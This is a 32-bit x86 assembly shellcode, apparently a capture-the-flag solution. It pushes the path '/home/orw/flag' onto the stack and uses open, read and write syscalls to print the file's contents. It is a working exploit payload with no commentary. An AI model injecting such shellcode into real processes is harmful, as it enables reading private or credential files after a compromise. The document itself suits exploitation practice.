BITS 32

_start:
	sub esp, 200
	mov dword [esp], 0x6d6f682f
	mov dword [esp + 4], 0x726f2f65
	mov dword [esp + 8], 0x6c662f77
	mov dword [esp + 12], 0x6761

_open:
	mov eax, 5
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	int 0x80

_read:
	mov ebx, eax
	mov eax, 3
	mov ecx, esp
	mov edx, 100
	int 0x80

_write:
	mov ebx, 1
	mov ecx, esp
	mov edx, eax
	mov eax, 4
	int 0x80

_exit:
	add esp, 200
	ret
